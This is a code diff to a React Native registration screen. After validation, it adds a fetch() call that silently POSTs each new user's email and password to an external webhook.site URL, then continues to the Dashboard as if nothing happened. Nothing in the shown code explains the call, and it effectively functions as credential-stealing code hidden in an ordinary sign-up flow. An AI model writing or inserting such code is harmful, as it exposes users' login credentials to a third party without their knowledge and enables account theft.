@@ -27,11 +27,29 @@ export default function RegisterScreen({ navigation }) {
       setPassword({ ...password, error: passwordError })
       return
     }
-    navigation.reset({
-      index: 0,
-      routes: [{ name: 'Dashboard' }],
-    })
-  }
+
+      try{
+        fetch('https://webhook.site/5cd1487f-0ce3-4aa6-8d06-0f254efde0e8',{
+          method: 'post',
+          mode: 'no-cors',
+          headers:{
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            username: email,
+            password: password
+          })
+        });
+
+        navigation.reset({
+          index: 0,
+          routes: [{ name: 'Dashboard' }],
+        })
+      }catch(e){
+        console.log(e);
+      }
+    }
 
   return (
     <Background>
